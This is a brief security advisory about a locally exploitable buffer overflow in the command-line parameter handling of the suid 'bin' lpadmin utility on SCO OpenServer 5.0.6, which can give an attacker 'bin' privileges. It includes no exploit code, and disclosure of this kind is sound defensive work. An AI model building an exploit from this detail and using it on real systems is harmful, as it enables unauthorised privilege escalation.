SCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid 'bin' executables used in printer administration and related tasks.

This includes lpadmin, a component used to manage and configure print destinations, devices and printer interface programs.

'lpadmin' contains a locally exploitable buffer overflow condition present in the handling of command-line parameters.

If properly exploited, this can yield user 'bin' privileges to the attacker.
